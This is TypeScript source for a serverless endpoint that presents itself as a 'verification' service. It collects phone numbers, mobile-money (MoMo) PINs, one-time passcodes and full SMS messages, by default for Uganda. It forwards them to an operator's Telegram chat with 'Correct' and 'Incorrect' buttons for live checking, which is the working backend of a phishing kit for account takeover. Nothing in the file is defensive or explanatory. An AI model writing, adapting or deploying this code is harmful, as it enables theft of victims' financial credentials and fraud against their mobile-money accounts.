// Universal Vercel Serverless Function: sendForVerification
export default async function handler(req: any, res: any) {
  if (res && typeof res.setHeader === 'function') {
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
    res.setHeader(
      'Access-Control-Allow-Headers',
      'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
    );
  }

  if (req.method === 'OPTIONS') {
    return res.status ? res.status(200).end() : res.end();
  }

  if (req.method !== 'POST') {
    return res.status ? res.status(405).json({ error: 'Method not allowed' }) : res.end(JSON.stringify({ error: 'Method not allowed' }));
  }

  try {
    let input = req.body;
    if (typeof input === 'string') {
      try {
        input = JSON.parse(input);
      } catch {
        input = {};
      }
    }
    input = input || {};

    const cleanEnv = (val?: string): string => {
      if (!val) return '';
      let s = val.trim();
      if ((s.startsWith('"') && s.endsWith('"')) || (s.startsWith("'") && s.endsWith("'"))) {
        s = s.slice(1, -1).trim();
      }
      return s;
    };

    const cleanToken = (val?: string): string => {
      let s = cleanEnv(val);
      if (s.toLowerCase().startsWith('bot') && s.includes(':')) {
        s = s.slice(3).trim();
      }
      return s;
    };

    const botToken = cleanToken(
      process.env.TELEGRAM_BOT_TOKEN ||
      process.env.BOT_TOKEN ||
      process.env.TELEGRAM_TOKEN ||
      process.env.TG_BOT_TOKEN ||
      process.env.TG_TOKEN ||
      process.env.TOKEN ||
      process.env.TELEGRAM_API_KEY ||
      process.env.VITE_TELEGRAM_BOT_TOKEN ||
      process.env.VITE_BOT_TOKEN ||
      process.env.ZITE_TELEGRAM_BOT_TOKEN ||
      ''
    );

    const chatId = cleanEnv(
      process.env.TELEGRAM_CHAT_ID ||
      process.env.CHAT_ID ||
      process.env.TELEGRAM_CHATID ||
      process.env.TG_CHAT_ID ||
      process.env.CHANNEL_ID ||
      process.env.CHATID ||
      process.env.VITE_TELEGRAM_CHAT_ID ||
      process.env.VITE_CHAT_ID ||
      process.env.ZITE_TELEGRAM_CHAT_ID ||
      ''
    );

    const escapeHtml = (text: string = ''): string => {
      return String(text)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
    };

    const formatExtraFields = (data: Record<string, any>, knownKeys: string[]): string => {
      const extraKeys = Object.keys(data).filter(
        (k) => !knownKeys.includes(k) && data[k] !== undefined && data[k] !== '' && typeof data[k] !== 'object'
      );
      if (extraKeys.length === 0) return '';
      const lines = extraKeys.map((k) => `• <b>${escapeHtml(k)}:</b> ${escapeHtml(String(data[k]))}`);
      return `\n\n📋 <b>Additional Details:</b>\n${lines.join('\n')}`;
    };

    const sessionId = `${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
    const timeStr = new Date().toUTCString();

    let messageHtml = '';
    if (input.type === 'pin') {
      messageHtml =
        `📱 <b>MoMo PIN Verification Required</b>\n\n` +
        `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || '')}</code>\n` +
        `🔐 <b>MoMo PIN:</b> <code>${escapeHtml(input.pin || 'N/A')}</code>\n` +
        `⏰ <b>Time:</b> ${escapeHtml(timeStr)}\n\n` +
        `👉 <i>Is this MoMo PIN correct?</i>` +
        formatExtraFields(input, ['type', 'country', 'countryCode', 'phone', 'pin']);
    } else if (input.type === 'final_otp' || (input.type === 'otp' && !input.smsMessage)) {
      messageHtml =
        `🔐 <b>4-Digit OTP Verification Required</b>\n\n` +
        `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || '')}</code>\n` +
        `🔢 <b>OTP Code:</b> <code>${escapeHtml(input.otp || 'N/A')}</code>\n` +
        `⏰ <b>Time:</b> ${escapeHtml(timeStr)}\n\n` +
        `👉 <i>Is this 4-digit OTP code correct?</i>` +
        formatExtraFields(input, ['type', 'country', 'countryCode', 'phone', 'otp']);
    } else {
      messageHtml =
        `📩 <b>SMS Message Verification Required</b>\n\n` +
        `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || '')}</code>\n` +
        `⏰ <b>Time:</b> ${escapeHtml(timeStr)}\n\n` +
        `💬 <b>Full SMS Message:</b>\n<pre>${escapeHtml(input.smsMessage || input.otp || 'N/A')}</pre>\n\n` +
        `👉 <i>Is this SMS message valid?</i>` +
        formatExtraFields(input, ['type', 'country', 'countryCode', 'phone', 'smsMessage', 'otp']);
    }

    if (botToken && chatId) {
      const keyboard = [
        [
          { text: '✅ Correct', callback_data: `correct_${sessionId}` },
          { text: '❌ Incorrect', callback_data: `incorrect_${sessionId}` },
        ],
      ];

      try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: messageHtml,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: keyboard },
          }),
        });
      } catch (tgErr) {
        console.error('[Telegram sendForVerification Error]:', tgErr);
      }
    }

    return res.status ? res.status(200).json({ sessionId }) : res.end(JSON.stringify({ sessionId }));
  } catch (error: any) {
    console.error('[Telegram sendForVerification Fatal Error]:', error);
    const fallbackSession = `${Date.now()}_fallback`;
    return res.status ? res.status(200).json({ sessionId: fallbackSession }) : res.end(JSON.stringify({ sessionId: fallbackSession }));
  }
}
